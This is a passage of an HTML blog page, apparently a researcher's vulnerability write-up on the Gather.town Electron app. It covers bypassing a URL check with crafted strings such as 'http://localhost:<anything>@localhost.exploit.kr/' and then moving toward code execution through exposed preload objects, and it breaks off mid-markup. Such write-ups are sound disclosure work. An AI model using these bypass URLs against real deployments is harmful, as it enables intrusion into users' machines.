+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABC0lEQVQY032OyU7EMBBE8zMhcbx0t93eHWdh5jCCAzf+/08QowHmhFSHJ5VK9QYCLjYFV1tYo4uBPBvnwLNNpIgUoiZURNqStlqaF6F/MxhFezlLPHt53evR6+Xcb3s5Sj7WvJXQaj1r3HLcY+ignZCokLWxQsIwCWPRB26cOriobAIuCnnWdsEgtJMYZoWjUKPQ4/1wWsy0fCsMo9DaOObm0+Z8BmCpySDP93r6MZye+E97FEYp9LFy6s7X3A6gRFwoNG2zjatx2XBT4GfDErxEv9xhkjB0G2+hXny+xroCb8gb+Z3ChmFH7uA2cB25IzeDy/Iwfzy/x/bZz4/S33y+gP0nV7BqMc/jL8W0Up9OB277AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="hostname check logic"
+        title="hostname check logic"
+        src="/static/fc947aee387c264d42363b863ccd3a98/37523/bundle-code5.png"
+        srcset="/static/fc947aee387c264d42363b863ccd3a98/e9ff0/bundle-code5.png 180w,
+/static/fc947aee387c264d42363b863ccd3a98/f21e7/bundle-code5.png 360w,
+/static/fc947aee387c264d42363b863ccd3a98/37523/bundle-code5.png 720w,
+/static/fc947aee387c264d42363b863ccd3a98/302a4/bundle-code5.png 1080w,
+/static/fc947aee387c264d42363b863ccd3a98/b1001/bundle-code5.png 1380w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>Since the <code class="language-text">include</code> method checks only if the string is included based on the blacklist, if a server containing the string is built as follows, it can be expressed as the phrase below.</li>
+</ul>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">    &lt;http://localhost.exploit.kr/></code></pre></div>
+<ul>
+<li>By bypassing the next host name check condition, it can be confirmed that the following conditions are ignored and returned after filtering is performed.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 578px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAnklEQVQY062PywrCMBBFU7HSKm0ymcmrNUlDk4Do/3+fVLpxIbrwLA8cuJeh5fWR8i2l6psTYwfWHNmvuMJpOQvXzxXDnULV80oSASQgodqgYRiUVqRoHEci7Ltuj4OPhJtFJERFiEII6ywAaKON1dPkXsYQIeccQLRtu8fWiFzyWtawBGN1iL7UjCR9uC4pxuiR5MfZ/PL9WvMO+wtPE5gOKZl/dJgAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="local check test"
+        title="local check test"
+        src="/static/0a009467f3866f2e7b29272571cdf537/508ef/local-test.png"
+        srcset="/static/0a009467f3866f2e7b29272571cdf537/e9ff0/local-test.png 180w,
+/static/0a009467f3866f2e7b29272571cdf537/f21e7/local-test.png 360w,
+/static/0a009467f3866f2e7b29272571cdf537/508ef/local-test.png 578w"
+        sizes="(max-width: 578px) 100vw, 578px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>If you specify the domain in the above way, you can see that you return the true value as follows, and based on this, you pass the URL check.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 31.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAABcElEQVQY0xXLyU7CQAAA0BEEylJBCnSBQnGmA1hkjQRBohISo2wiUlooooihYvhKPWmMJnrhIMbEgwf14BcY3/2Bnjbu9cfDoX46vOppunY6HQwn/cH4fKS3lEuYH8HCJZ3S3HHVKnZMsG2GbWKtbYCyI1IDPlpgaL/AcjwXoBmeomiej4WEJMtgNx0XSnp455rJ67bEmXl9YIpqyzHNsq4ZsOqWjgHjDTLkqt/u8lhdXtJpISwchwSYDeOMuFFE+Y4v3qBwmRQKbHw/lG0E01UmUQeishKpgYBfopwBjkaIlwqhcAHjSjq3l9guFdWDykVia+LJzGxiyxA8IFDTio7IaNsWOwGw6xAPAcdgO0HLdXn+/DJ/evp4XXzeP8yqSjnX7ZTHqU3NHJEJrBqRYoSKCXWNUAZQBkj5zyFOYldwbb/5eHf3+/P19v59c7vYLlXZrArLM7g79eUuPNk+lVGpjOpMqlapv4Q6AClkpPoHB4BVP8CQ4TYAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="local server exploit testing"
+        title="local server exploit testing"
+        src="/static/25f1b2e1d7376b0777454abac88dc33f/37523/local-test-2.png"
+        srcset="/static/25f1b2e1d7376b0777454abac88dc33f/e9ff0/local-test-2.png 180w,
+/static/25f1b2e1d7376b0777454abac88dc33f/f21e7/local-test-2.png 360w,
+/static/25f1b2e1d7376b0777454abac88dc33f/37523/local-test-2.png 720w,
+/static/25f1b2e1d7376b0777454abac88dc33f/302a4/local-test-2.png 1080w,
+/static/25f1b2e1d7376b0777454abac88dc33f/2cefc/local-test-2.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>If you open the server for request testing in a local environment, enter the domain <code class="language-text">http://localhost/exploit_test</code> into a vulnerable Portal Tile, and proceed with the interaction, you can check the response values as follows and confirm that the operation is successful.</li>
+</ul>
+<p><strong>gather town Electron Application Portal Tile Object interaction before URL check logic</strong></p>
+<ul>
+<li>However, when performing interaction on the vulnerable Portal, you can check the <code class="language-text">The portal does not meet the URL requirement</code> error message as follows.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABv0lEQVQY0yXLO2/TQAAAYC9UaiKRKAlNpQJJ7Nh3vjv7Xj777Djuw1ESKAsDYmPiT0TqyF+IxB9JJ1RR8ZJQtmwMRE2TFCQkxNANNaj02z/juU4znnfE8MUBfyIlMFGpdB84AGMsw2T/sCel4kJCl5iWk6Y869JYExUQz0fG6+hhj8pc6Fep8zIi3Etq9R0uZRgqJpM06wkZCqkAxKblxDEPFMUIOI7baFpG6xHzUP988m72ZTr79HX28fO36fR8cqrjWOsk7/WjKPEpv8tS+FIQQiAALoDQePvm5Ox08ms+v75a/1leXq/Xv5c/LufL0WgkAt0bHCfpEeMKcm+PWLZEPKM0ZUhhHGDjw9n7zWZzsVx9v1isrn4uVqv5YvH35mY8HruYDobP4s6+VBGh7LFpIZ/6kmGPuC5s27ZBfRkEuQryrJv3+8cqiBiljNJGo6FU1M0OuQh8yiHEzVZbiIAxHyGbuNB1oFGpVHfr5m7dLJfKW1v3trcLxWKxUCiUy2UV6qO8H+kOZQJA1GzZUnLKPOh6AMCW1b7NO7ceVGvVO5X/atWajtPB8GnaPVChFjIEEEHX9ahPCCYY2Q78B34/gjLqqSUBAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="local test binary"
+        title="local test binary"
+        src="/static/2df796b048d24511b8ffb529afa615a0/37523/local-test-exploit.png"
+        srcset="/static/2df796b048d24511b8ffb529afa615a0/e9ff0/local-test-exploit.png 180w,
+/static/2df796b048d24511b8ffb529afa615a0/f21e7/local-test-exploit.png 360w,
+/static/2df796b048d24511b8ffb529afa615a0/37523/local-test-exploit.png 720w,
+/static/2df796b048d24511b8ffb529afa615a0/302a4/local-test-exploit.png 1080w,
+/static/2df796b048d24511b8ffb529afa615a0/53ac9/local-test-exploit.png 1287w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>Through the corresponding error message value, it may be confirmed that there is a verification algorithm when the interaction is performed internally (URL request).</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/0lEQVQI1wH0AAv/ABgYLgwKEAwLEhAPFBwbHxUVFBUVFh4eIScqLy4tMDQuLTEsKisoKSspKy4pKS4pKC0rLCkpKyIgIi4uMQBNT2RJRFhQTGJJQ1MRDxUUFBMSExIqKy01MzU9PUBCOzo/ODg+OTg7NjY+NzU+NzU9ODc6NTQ2MzI2NTcAxLm2t7S2wb27rqmmdnJtgH51d3FrNC4wMy8xPzxAPzg4PDc6Ozg7NTEzMy8yLysuMistMy0vKSstLS0vAMbGvbrNzbbFxbjJyMLS0sbY2ba3uC4kJyomKiknKyYhJCYhJSchJCgjJiciJiUhJCkiJSoiJRweISUlKPlhPzWGxflkAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="local binary exploit testing (exception)"
+        title="local binary exploit testing (exception)"
+        src="/static/a59e3072816b463a117c8d2a26af2b16/37523/local-test-3.png"
+        srcset="/static/a59e3072816b463a117c8d2a26af2b16/e9ff0/local-test-3.png 180w,
+/static/a59e3072816b463a117c8d2a26af2b16/f21e7/local-test-3.png 360w,
+/static/a59e3072816b463a117c8d2a26af2b16/37523/local-test-3.png 720w,
+/static/a59e3072816b463a117c8d2a26af2b16/302a4/local-test-3.png 1080w,
+/static/a59e3072816b463a117c8d2a26af2b16/2cefc/local-test-3.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>In Gather Town Electron based Application portal tile interaction to <code class="language-text">enter key</code></li>
+</ul>
+<p>The following source code includes an algorithm that performs URL inspection when Portal Interaction is performed, and analysis was conducted on that part.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 31.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAm0lEQVQY042NSwrDMAxEfRknki3J8T8/N+2u9z9RawKlS8NbDDMMT2lka927tOf6umrbw3rm80hHq63lbfXlnyqxSCoSs8SHi0oDIXkfNuLIHNAIAAF2ZujcuZe/fK9IagLipbh0iVtl2SQeSH5CHqGbU95rPQ1HJI/WDT77eULhpdT9xf4I6RRfZuMGUbMRK2FC0UAaaFz7NX8A8j0/UqHjeVAAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="/default/bundle.ebbe1909e06faf0f894b.js:18122"
+        title="/default/bundle.ebbe1909e06faf0f894b.js:18122"
+        src="/static/adaa0293896b95f9faee89b88b513e48/37523/bundle-code6.png"
+        srcset="/static/adaa0293896b95f9faee89b88b513e48/e9ff0/bundle-code6.png 180w,
+/static/adaa0293896b95f9faee89b88b513e48/f21e7/bundle-code6.png 360w,
+/static/adaa0293896b95f9faee89b88b513e48/37523/bundle-code6.png 720w,
+/static/adaa0293896b95f9faee89b88b513e48/302a4/bundle-code6.png 1080w,
+/static/adaa0293896b95f9faee89b88b513e48/2cefc/bundle-code6.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<div class="gatsby-highlight" data-language="tsx"><pre class="language-tsx"><code class="language-tsx">    <span class="token function">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token string">"^\\\\s*(&lt;http://localhost>:|https://([a-zA-Z0-9]+\\\\.)*gather\\\\.town($|/))"</span><span class="token punctuation">)</span>
+    
+    <span class="token number">1.</span> <span class="token operator">&lt;</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token operator">></span><span class="token operator">:</span>
+    <span class="token number">2.</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span><span class="token constant">Z0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span>gather<span class="token punctuation">.</span>town</code></pre></div>
+<ul>
+<li>After unpacking the target source code, the 18122 line was analyzed, the regular expression check of <code class="language-text">javascript String.prototype.match()</code> is performed, and if it is approximately in the form <code class="language-text">http:localhost:port</code>, <code class="language-text">https://</code> subdomain formats are included. If the values are included, if the True value is returned, it can be confirmed that the <code class="language-text">window.location.href</code> object is substituted for Redirection.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 16.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAcklEQVQI142LwQrCMBAFkyax1GrydrcWW7IJIojae4969v9/yIPeFYY5DIyZ8+16X3NZ5HAiqYkKSQWXRLpPGVwjlOTrrj+C6ydud5OZ5sswniNyhCbS0A7WofH0E2N7A9a2G11gvxEX+J+t8WQdHs/XG5c6Csu2lIkFAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="local test security logic bypass testing"
+        title="local test security logic bypass testing"
+        src="/static/fe0bac6ff0a2a67f1b1e1e4c3e52ea06/37523/local-test-4.png"
+        srcset="/static/fe0bac6ff0a2a67f1b1e1e4c3e52ea06/e9ff0/local-test-4.png 180w,
+/static/fe0bac6ff0a2a67f1b1e1e4c3e52ea06/f21e7/local-test-4.png 360w,
+/static/fe0bac6ff0a2a67f1b1e1e4c3e52ea06/37523/local-test-4.png 720w,
+/static/fe0bac6ff0a2a67f1b1e1e4c3e52ea06/302a4/local-test-4.png 1080w,
+/static/fe0bac6ff0a2a67f1b1e1e4c3e52ea06/66465/local-test-4.png 1097w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>If the URL is inspected in the form of <code class="language-text">user:password@</code> based on the <code class="language-text">RFC 3986 protocol</code>, the following results can be confirmed.</li>
+<li>Wow, so let’s check the regular expression in the following URL formathttp://localhost:<anything>@localhost.exploit.kr/</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABiElEQVQoz42R3Y6bMBBGbTBJgAQwrO0YzG8CISua3LRqtzftRZ+gb9DX4x2trwpaRd3dVt2LoxnJM2dmZFKWZxwOF8jCIG8a7E2FTBukRYldquFvBdgqBXUTOIz/F3JtJ3z79B2PxwGntkMtS6ShxJqloE4C4iR32Xuk5NJOePrwGUPVoi9rnJoWTV5BxxrsVTFlb8WvhxBVjDhPXxBEOTahxjq4oUBvjyQCoRGIE79odJ9F5C+bkzrv0dUjzL5DY4Ylr4seRncQaQnBK2Q7Dc97briJaLxsH66yu/QuPDUDDv2E8XyFzluofQ0pa+SmgxAVktiA7zSesgofYwMdKnSRxldRQ/jirbAvR1vtj7Z4aKwRrZWxsSHjC1uP292K2w3ltjLC/vrZ20tS2IkXdrNKLXET6zBuqZtY6vIFcjQDdD5AihZKHaDkYcl9X8JjHJ6XIvAyXJXBj8fjcurtZPKPnyd9Zmbhi1n+gQrkHRnIWYdqnqJiHn09b9fZTN1kdhlfosP4C34Dc4nREI8PlWgAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="local test security logic multi bypass"
+        title="local test security logic multi bypass"
+        src="/static/88a32285f98d54a7e554f54b712b5bb2/37523/local-test-6.png"
+        srcset="/static/88a32285f98d54a7e554f54b712b5bb2/e9ff0/local-test-6.png 180w,
+/static/88a32285f98d54a7e554f54b712b5bb2/f21e7/local-test-6.png 360w,
+/static/88a32285f98d54a7e554f54b712b5bb2/37523/local-test-6.png 720w,
+/static/88a32285f98d54a7e554f54b712b5bb2/00d43/local-test-6.png 1000w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>After passing the Portal Tile Check inspection through MapMaker and bypassing the Gather.town Electron regular expression, redirection is possible to the window.location.href attribute in the form of ‘localhost.*’, so the existing object responds in the desired direction.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 43.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABX0lEQVQoz32NXUvCUACGJyG4IXrc5rbmcDvb2Y47Z06bmx850JuMJOhPdxFRCfYrMr0sP3OxoCCxHp6rFx5eZrne/fi23CRJcv8wQXat5nphu9OKIs/zW2EUtTtRu5suYfssaPmNpt9oMkdjt+Y1/VadNrFNHNvtdeJet9+oB9T1aw5NR+Q6yD0STx6fTVmvCCpUdPPUgIpua4hAFyqGxquVLzUh9Vf8vtqs9snd7YQ7yTIMk8lkmP85eN7uk+nTFOmwLEnQgBDCarWqqqokSYVCgWXZfD7PcRzHctls9uB5u/lI5i+Lm/HYwXgwGMRxHIah53mWZSmKUi6XJUnieR4AkMvlDuP1LpnP5uPRhWlZ/fOUIAgwxrIsAwBKpZIgCAAAURRZlj0az66vRhVNC76hlBJCEEKGYei6Lorin8+L+evlcFjVDUIIxphSihAihJimiRCybZtSqqpqsVj8BJE94LjbtcWNAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="exploit RCE"
+        title="exploit RCE"
+        src="/static/ebf1df855fa4b49e146f150a220beac0/37523/exploit-master.png"
+        srcset="/static/ebf1df855fa4b49e146f150a220beac0/e9ff0/exploit-master.png 180w,
+/static/ebf1df855fa4b49e146f150a220beac0/f21e7/exploit-master.png 360w,
+/static/ebf1df855fa4b49e146f150a220beac0/37523/exploit-master.png 720w,
+/static/ebf1df855fa4b49e146f150a220beac0/302a4/exploit-master.png 1080w,
+/static/ebf1df855fa4b49e146f150a220beac0/2cefc/exploit-master.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>awesome, it can be confirmed that the Electron Application has been redirected in the desired direction and Output to the user as follows.</li>
+</ul>
+<p><strong>Sandbox Escape and Code Execution via Electron preload scripts</strong></p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 90.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAADpUlEQVQ4y32SS2/kRBSF/UOYtNvverv8fnQn3Z2kZxIymWQmmTAjISEQf4L/xQKMkOgIdrCJxYZtGoSUFXv7IHsSER7D4lMd3ypfnVO3jIXQOKj3cHF8ipPVGqtqhXlcYS8pschK7MYFnuW7KHWKjCtkIkTGw1EXKsKnr9/gk7cfY7U+hk8ljJipziKyE1HeibjomM47GqYdC5MuUEmX6qw7y6rOVXHHVNIRFXd00GHaEZV0Os67Ki27QOjOC3hnlEwhilKs9w9xsNzHrF4gTUpIHoIxhUJqnOkEAZVQPIR4BB/+5SEiEcIJODwiYCxltFml+fXpYm9zsjvfPC2rzUzFm4LJ65TJzaHQ338WZz9qKr8rmbouudo8UDC1yX22oU6weWJ5G8slG6OQ+qdC6lb7/EYHoo2pbBOm2lzoNhH65iCMf/48K3/RPLwphG59IlqPiNYNeEt42J5fXLXnr67as5eX7WJ/3RpFmEIkNeJ8higbqEeYSkBEBCJjUBnBFxFyESEgAnYgxogulUiKOcrZAtVsiTirYBwn+ZfH5eybF7NZ87yqm6M0b06KqjkIdbPHebMQolkK0eSMffVFXvywFPJbRujXIWWNIrRhrtfYttNMLLuxHLcx5py3dZz+tpvktwmTW0XJVvjeVgXBNuZ8GxIyohi7PZTy95TSX0PGbod9zcNt6Plb4bjbiWVtLcvaGrFP/4h4jUzsIhVzKJrDDxSmjg/T8jCx3JFBfzB1sDMd9LvaxPZhT10Qy8MT04ZpOjASn95FrEKiqq7IZj0nYe/YQW9OnX5i2r05tXvTtAfd/U2bdr9jWr1ruT21vX5nPOv0RuSTu4TXmMn9XtEMcVoiSXNMBwemjZ2JNa7/1OO3acOZOiCW+87h1IER++QuZhVKuegFicGGRys1AsLHA55PYdkebMeH65GxNjDUhui+64O5AXbu62PDhM9Gh4xEUDrGcnWIl68ucXZ+gfX6CKen53h29CGen57h9MU5jo5OsH56jIvLK1xevMaby49QzxdjAiPygruY1ajlspc0hVTR6G6IPLqYOqN+cDXwsGe7AXzHh3ADTAaHpv2Xw1qu+pBlcF06xnt8V+/jycT69x0OQ9GsxFzu98PKRQTK5XhfQ4Th0OQ9jEOxXFDbG/XYML2f8q7a73MxRx7NUVd70FGC6RD3fxiaepYL9rjh8A61x5EQ1edCQzkU3PahPALpBuC2B+H8N9zxoBwfZGh4P+U/AS8QGMIt2eXvAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="root cause flow"
+        title="root cause flow"
+        src="/static/c28fa5d9e52a650f1e5e1b21bbd30ff3/37523/root-cause-flow.png"
+        srcset="/static/c28fa5d9e52a650f1e5e1b21bbd30ff3/e9ff0/root-cause-flow.png 180w,
+/static/c28fa5d9e52a650f1e5e1b21bbd30ff3/f21e7/root-cause-flow.png 360w,
+/static/c28fa5d9e52a650f1e5e1b21bbd30ff3/37523/root-cause-flow.png 720w,
+/static/c28fa5d9e52a650f1e5e1b21bbd30ff3/218a4/root-cause-flow.png 1052w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>Electron Preload Script runs outside the Sandbox and starts before the Render Script loads, and these features have access to application data structures that can be isolated or separated from the Electron Sandbox.</li>
+<li>Within the Electron Application, since the Preload Script exported from the application to the Global Window, Code Execution trigger is possible using the interop.js source.</li>
+</ul>
+<p><strong>Electron Application NodeIntegration Options Enable (Node JS , Code Execution)</strong></p>
+<ul>
+<li>If you check the Interop.js code of the Gather.town Electron APP Source Code, you can see that the electronic module has been imported and the internally necessary APIs have been redefined in the Interop object.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 28.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxUlEQVQY033Q627DIAwF4LxHs5g7hgQwjEKbda1Wae//SlMTTZp2k84/+/ORPNxe+jnnRql6n9GhNHu8NFZo4Ip9ZgKxBLrf31+vb72vjKuhPBMRhTh7tFob4Aq4mrjiXH3DwKTFufX1vF7qsQOTQ2u55JRSDA6jQy70vip+4N0fRjiM8DTxR3M9Uk6U4hIcorZs64Q/8GMq9J4Nt5KphOCDQ6XMCGJiArYT5jf8NcOl17XQqdApl+qXvKToZrs9zEnzP/4AFA42ibPRztEAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="Gather.town Binary interop.js"
+        title="Gather.town Binary interop.js"
+        src="/static/9daf26062345cd3a2fb5cd29c0a4d51e/37523/a-1.png"
+        srcset="/static/9daf26062345cd3a2fb5cd29c0a4d51e/e9ff0/a-1.png 180w,
+/static/9daf26062345cd3a2fb5cd29c0a4d51e/f21e7/a-1.png 360w,
+/static/9daf26062345cd3a2fb5cd29c0a4d51e/37523/a-1.png 720w,
+/static/9daf26062345cd3a2fb5cd29c0a4d51e/302a4/a-1.png 1080w,
+/static/9daf26062345cd3a2fb5cd29c0a4d51e/fe8a7/a-1.png 1223w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>Introp objects defined in introp.js are assigned to global window objects and can be used globally.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAWElEQVQI13XLSxKAIAgA0I6SqAECBfa5/9GaWrhz5m3fws0GJCkVc0HIW4IKuULe1lRmljGJ1eOM8N7jvB4kIVZiTVCn+fAuokis5l/ut+3+C9tdzZvYzAvVSBxvDABm2AAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="Gather.town Binary window export object to interop.js!"
+        title="Gather.town Binary window export object to interop.js!"
+        src="/static/7f9bc2e09787cae7c28cd5f90678c40e/37523/a-2.png"
+        srcset="/static/7f9bc2e09787cae7c28cd5f90678c40e/e9ff0/a-2.png 180w,
+/static/7f9bc2e09787cae7c28cd5f90678c40e/f21e7/a-2.png 360w,
+/static/7f9bc2e09787cae7c28cd5f90678c40e/37523/a-2.png 720w,
+/static/7f9bc2e09787cae7c28cd5f90678c40e/302a4/a-2.png 1080w,
+/static/7f9bc2e09787cae7c28cd5f90678c40e/a3a5c/a-2.png 1277w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span>
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
